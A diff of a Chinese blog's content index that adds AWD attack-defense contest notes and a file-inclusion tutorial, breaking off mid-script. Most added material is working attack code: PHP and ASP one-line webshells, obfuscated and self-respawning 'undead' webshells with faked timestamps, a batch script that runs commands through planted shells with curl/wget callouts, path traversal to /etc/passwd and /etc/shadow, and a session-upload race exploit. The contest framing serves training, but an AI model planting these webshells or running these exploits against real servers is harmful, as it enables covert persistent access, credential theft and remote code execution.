@@ -38,6 +38,59 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打包目录</span></span><br><span class="line">tar -zcvf archive_name.tar.gz directory_to_compress</span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">tar -zxvf archive_name.tar.gz</span><br></pre></td></tr></table></figure>
 
 <h2 id="查找后门"><a href="#查找后门" class="headerlink" title="查找后门"></a>查找后门</h2><p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用批量脚本后门攻击其他靶机。</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>使用工具对目标网站进行扫描，目标服务器开放的端口，方便进行漏洞利用。</p>
+<p>扫描工具：Namp，御剑等等。</p>
+<p>以下是一些服务端口的漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22：  ssh弱口令</span><br><span class="line">873： 未授权访问漏洞</span><br><span class="line">3306：mysql弱口令</span><br><span class="line">6379：redis未授权访问漏洞</span><br></pre></td></tr></table></figure>
+
+<h2 id="搜索存活主机"><a href="#搜索存活主机" class="headerlink" title="搜索存活主机"></a>搜索存活主机</h2><p>信息收集</p>
+<ul>
+<li>nmap、Routescan</li>
+<li>Python 脚本</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">for x in range(2,255): </span><br><span class="line">    url = &quot;http://192.168.1.&#123;&#125;&quot;.format(x) </span><br><span class="line">    try: </span><br><span class="line">        r = requests.post(url) </span><br><span class="line">        print(url) </span><br><span class="line">        except: </span><br><span class="line">        pass</span><br></pre></td></tr></table></figure>
+
+<h2 id="预留后门利用"><a href="#预留后门利用" class="headerlink" title="预留后门利用"></a>预留后门利用</h2><p>记录一下蚁剑连接，get型木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">/shell.php?pass=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">连接密码：<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>常用一句话木马：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php： </span><br><span class="line">	<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span>      </span><br><span class="line">	<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line">asp：   </span><br><span class="line">	&lt;%<span class="keyword">eval</span> <span class="title function_ invoke__">request</span> (<span class="string">&quot;pass&quot;</span>)%&gt;</span><br><span class="line">aspx：</span><br><span class="line">	&lt;%@ Page Language=<span class="string">&quot;Jscript&quot;</span>%&gt;</span><br><span class="line">	&lt;%<span class="keyword">eval</span>(Request.Item[<span class="string">&quot;pass&quot;</span>],<span class="string">&quot;unsafe&quot;</span>);%&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> http <span class="keyword">import</span> cookies</span><br><span class="line"><span class="keyword">import</span> sys,requests,base64,time</span><br><span class="line"><span class="keyword">from</span> matplotlib.pyplot <span class="keyword">import</span> flag</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) <span class="comment">#禁用安全请求警告</span></span><br><span class="line"><span class="comment">#利用一句话木马得到flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#加载一句话地址的文件</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell_list</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="comment">#格式 http://192.168.174.128/shell.php</span></span><br><span class="line">    <span class="comment">#返回列表</span></span><br><span class="line">    <span class="keyword">try</span> : </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filepath,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            data = f.readlines()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> : </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File&quot;</span>+filepath+<span class="string">&quot; Not Found!&quot;</span>) </span><br><span class="line">        sys.exit()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getflag</span>(<span class="params">filepath</span>):</span><br><span class="line">    file = <span class="string">&#x27;flag&#x27;</span>+<span class="built_in">str</span>(time.time())[-<span class="number">5</span>:]+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="comment">#加载shell地址</span></span><br><span class="line">    <span class="built_in">list</span> = shell_list(filepath)</span><br><span class="line">    <span class="comment">#访问 执行查看flag命令  linux就是cat</span></span><br><span class="line">    <span class="comment"># get方式</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;cat /flag&quot;);&#x27;</span></span><br><span class="line">    <span class="comment"># getflag_cmd =&#x27;echo system(&quot;wget -q -O - http://192.168.1.146:9898/flag&quot;);&#x27;                          		# post方式                   </span></span><br><span class="line">    passwd=<span class="string">&quot;dbapp#2020&quot;</span> <span class="comment">#木马密码</span></span><br><span class="line">    payload =  &#123;passwd: <span class="string">&#x27;system(&quot;curl http://10.0.1.2?token=XFMDKLVJ&quot;);&#x27;</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">        <span class="comment">#url  = url.strip(&#x27;\r\n&#x27;) + &quot;?x=&quot; +getflag_cmd            #get方式</span></span><br><span class="line">        url  = url.strip(<span class="string">&#x27;\r\n&#x27;</span>)                                  <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#res = requests.get(url=url,timeout=5)                #get方式</span></span><br><span class="line">            res = requests.post(url=url,data=payload,timeout=<span class="number">5</span>)   <span class="comment">#post方式</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(url+<span class="string">&quot;[ - ] request timeout [ - ]&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> res.content:</span><br><span class="line">            content = <span class="built_in">str</span>(res.content,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">            <span class="comment">#把得到的flag存到flag文件再批量提交</span></span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.writelines(content+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;写flag.txt文件失败！！&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] getflag sucessed! flag文件:&quot;</span> +file)</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"><span class="comment">#批量提交flag</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sentflag</span>(<span class="params">filepath,url</span>):</span><br><span class="line">    filename = getflag(filepath)<span class="comment">#返回存放flag的地址</span></span><br><span class="line">    <span class="comment">#读取存放flag文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        flags = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            flag_p=flag.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;atn&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;2&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;flag&#x27;</span>:flag_p</span><br><span class="line">            &#125;</span><br><span class="line">            cookie=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;Samesite&#x27;</span>:<span class="string">&#x27;&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;php-console-server&#x27;</span>:<span class="string">&#x27;3&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;matchToken_131&#x27;</span>:<span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">                    <span class="string">&#x27;adl&#x27;</span>:<span class="string">&#x27;5&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span> : </span><br><span class="line">                res = requests.post(url, data=data, verify=<span class="literal">False</span>, cookies=cookie)</span><br><span class="line">                <span class="keyword">if</span> res.status_code==<span class="number">200</span> :</span><br><span class="line">                  <span class="built_in">print</span>(<span class="string">&quot;Get flag Success&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> : </span><br><span class="line">                 <span class="built_in">print</span>(<span class="string">&quot;[ ------------&gt; ] Send Flag Failed [ &lt;----------- ]&quot;</span>)</span><br><span class="line">                 sys.exit()</span><br><span class="line">            </span><br><span class="line">           </span><br><span class="line"><span class="comment">#第一个参数需要一个存放shell的地址，格式 http://192.168.174.128/test.php?x=    </span></span><br><span class="line"><span class="comment">#第二个参数需要提交flag的地址 例如http://1.1.1.1/submit.php?token=xxxx&amp;flag=xxxxx</span></span><br><span class="line"></span><br><span class="line">filepath = <span class="string">&#x27;./bsm_shell.txt&#x27;</span> <span class="comment">#自己创建</span></span><br><span class="line">url = <span class="string">&#x27;https://10.0.0.xx/mx/xx/axx&#x27;</span></span><br><span class="line"></span><br><span class="line">sentflag(filepath,url)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="WebShell隐藏与利用"><a href="#WebShell隐藏与利用" class="headerlink" title="WebShell隐藏与利用"></a>WebShell隐藏与利用</h2><p><strong>隐藏shell</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件命名形式：</span><br><span class="line">.shell.php</span><br><span class="line">-shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>特殊Shell形式</strong></p>
+<p>1、连接方式：php?2=assert密码是1。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[<span class="number">2</span>]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[<span class="number">1</span>])<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、配置为?b=))99(rhC(tseuqeR+lave</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">chr</span>( <span class="number">96</span>^<span class="number">5</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">chr</span>( <span class="number">57</span>^<span class="number">79</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">chr</span>( <span class="number">15</span>^<span class="number">110</span>);</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">chr</span>( <span class="number">58</span>^<span class="number">86</span>);</span><br><span class="line"><span class="variable">$e</span>= <span class="string">&#x27;($_REQUEST[C])&#x27;</span>;</span><br><span class="line">@<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>.<span class="variable">$b</span>.<span class="variable">$c</span>.<span class="variable">$d</span>.<span class="variable">$e</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>连接密码:0（零）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sF</span>= <span class="string">&quot;PCT4BA6ODSE_&quot;</span>;<span class="variable">$s21</span>=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$sF</span>[<span class="number">4</span>].<span class="variable">$sF</span>[<span class="number">5</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">6</span>].<span class="variable">$sF</span>[<span class="number">3</span>].<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>].<span class="variable">$sF</span>[<span class="number">1</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">8</span>].<span class="variable">$sF</span>[<span class="number">10</span>]);<span class="variable">$s22</span>=$&#123;<span class="title function_ invoke__">strtoupper</span>(<span class="variable">$sF</span>[<span class="number">11</span>].<span class="variable">$sF</span>[<span class="number">0</span>].<span class="variable">$sF</span>[<span class="number">7</span>].<span class="variable">$sF</span>[<span class="number">9</span>].<span class="variable">$sF</span>[<span class="number">2</span>])&#125;[<span class="string">&#x27;n985de9&#x27;</span>];<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s22</span>))&#123;<span class="keyword">eval</span>(<span class="variable">$s21</span>(<span class="variable">$s22</span>));&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>4、MD5木马</p>
+<p>将pass中换成你熟悉的Md5，防止他人利用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>5、MD5木马+利用header</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>])==<span class="string">&#x27;d8d1a1efe0134e2530f503028a825253&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] == <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$test</span>= <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;flag:<span class="subst">$test</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>上传不死马</strong></p>
+<p>例子</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&#x27;</span>cmd<span class="string">&#x27;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; shell2.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#passwd=y0range857</span></span><br><span class="line"><span class="comment">#POST传参：passwd=y0range857&amp;a=system(&#x27;ls&#x27;);</span></span><br></pre></td></tr></table></figure>
+
+<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，用蚁剑连接。</p>
+<p><strong>双写入shell</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ignore_user_abort</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;.login.php&#x27;</span>;</span><br><span class="line"><span class="variable">$file1</span> = <span class="string">&#x27;/admin/.register.php&#x27;</span>; </span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_GET[&quot;passwd&quot;])==&quot;6daf17e539bf44591fad8c81b4a293d7&quot;)&#123;@eval($_REQUEST[&quot;at&quot;]);&#125; ?&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .login.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file1</span>,<span class="variable">$code</span>);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; /admin/.register.php&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">usleep</span>(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>浏览器访问at.php，生产不死马at2.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/upload/at.php</span><br><span class="line">获取命令</span><br><span class="line">url/upload/at2.php?passwd=obse007&amp;at=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>AWD</category>
@@ -204,6 +257,152 @@
       </categories>
       <tags>
         <tag>win10</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/posts/4089de4e.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含是指会在单个文件写入需要重复使用的函数，在需要使用的时候就直接调用此文件，这种文件调用的过程一般被称为文件包含。文件包含分为本地文件包含和远程文件包含，说明如下：</p>
+<ul>
+<li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
+<li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
+</ul>
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
+<h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含</span><br></pre></td></tr></table></figure>
+
+<p>include() 函数在包含中出现错误，会警告一次，但是代码会继续运行，require() 函数它与 include 函数几乎一样，区别是它运行错误就会中止脚本。</p>
+<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>类似代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a><strong>读取敏感信息</strong></h3><p>本地无限制读取，服务器没有过滤敏感信息。</p>
+<p><strong>Exp:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>常见敏感信息路径：路径也可能因为版本的更新而更改</p>
+<table>
+<thead>
+<tr>
+<th align="left">Windows系统路径</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">c:\boot.ini</td>
+<td align="center">查看系统版本</td>
+</tr>
+<tr>
+<td align="left">c:\windows\system32\inetsrv\MetaBase.xml</td>
+<td align="center">IIS配置文件</td>
+</tr>
+<tr>
+<td align="left">c:\windows\repair\sam</td>
+<td align="center">存储Windows系统初次安装的密码</td>
+</tr>
+<tr>
+<td align="left">c:\ProgramFiles\mysql\my.ini</td>
+<td align="center">MySQL配置</td>
+</tr>
+<tr>
+<td align="left">c:\ProgramFiles\mysql\data\mysql\user.MYD</td>
+<td align="center">MySQL root密码</td>
+</tr>
+<tr>
+<td align="left">windows系统</td>
+<td align="center">php 配置信息</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>Linux/Unix系统路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>/etc/passwd</td>
+<td>账户信息</td>
+</tr>
+<tr>
+<td>/etc/shadow</td>
+<td>账户密码文件</td>
+</tr>
+<tr>
+<td>/usr/local/app/apache2/conf/httpd.conf</td>
+<td>Apache2默认配置文件</td>
+</tr>
+<tr>
+<td>/etc/passwd // 账户信息</td>
+<td>虚拟网站配置</td>
+</tr>
+<tr>
+<td>/usr/local/app/php5/lib/php.ini</td>
+<td>PHP相关配置</td>
+</tr>
+<tr>
+<td>/etc/passwd // 账户信息</td>
+<td>Apache配置文件</td>
+</tr>
+<tr>
+<td>/etc/my.conf</td>
+<td>mysql 配置文件</td>
+</tr>
+</tbody></table>
+<h3 id="Session漏洞利用"><a href="#Session漏洞利用" class="headerlink" title="Session漏洞利用"></a>Session漏洞利用</h3><ul>
+<li><strong>php中的session.upload_progress</strong></li>
+</ul>
+<p>前提：php版本 &gt; php5.4</p>
+<p>在php.ini中有几个默认选项</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.use_strict_mode</span>=<span class="literal">off</span></span><br></pre></td></tr></table></figure>
+
+<p>详解配置</p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">enabled=on表示upload<span class="built_in">_</span>progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；</span><br><span class="line">cleanup=on表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；</span><br><span class="line">name当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；</span><br><span class="line">prefix+name将表示为session中的键名</span><br><span class="line">session.use<span class="built_in">_</span>strict<span class="built_in">_</span>mode=off这个选项默认值为off，表示我们对Cookie中sessionid可控。</span><br></pre></td></tr></table></figure>
+
+<p>可以利用<code>session.upload_progress</code>将恶意语句写入session文件，从而包含session文件。前提需要知道session文件的存放位置。</p>
+<ul>
+<li>前提：session 的存储位置可以获取</li>
+</ul>
+<p>通过phpinfo函数，读取session的存储位置，一般路径为：在session.save_path中有显示:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/php/session</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>条件竞争</li>
+</ul>
+<p>举个例子</p>
+<p>将包含漏洞的代码写入文件 session.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码功能，通过 GET 将变量值读入到 session 中。</p>
+<p>首先需要通过传入变量，查看 Cookies 中的 PHPSESSID 的值，其内容就是文件名。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">url/session.php?ctfs=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>Exp：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../var/lib/php/session文件名</span><br></pre></td></tr></table></figure>
+
+<p>通过上面写入的恶意代码，你访问文件名就可以执行了。</p>
+<p><strong>问题一</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果没有session_start(),如何创建session文件</span><br></pre></td></tr></table></figure>
+
+<p>解答：</p>
+<p>当session.auto_start=on时，PHP在接受到请求后初始化Session，不用执行session_start（）。但是默认情况下，这个选项是不开启的。</p>
+<p>但是session中存在一个默认选项，<code>session.use_strict_mode=0</code>。表示用户可以自定义session的ID，例如，设置Cookie里的PHPSESSION=FLAG，php就会在服务上创建一个文件：/tmp/sess_FLAG。虽然我们自己没有初始化，但是PHP也会自动初始化。并产生一个键值这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p>
+<p><strong>漏洞利用脚本</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://127.0.0.1:5555/test56.php&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://127.0.0.1:5555/test56.php?file=session/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            <span class="built_in">print</span>(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        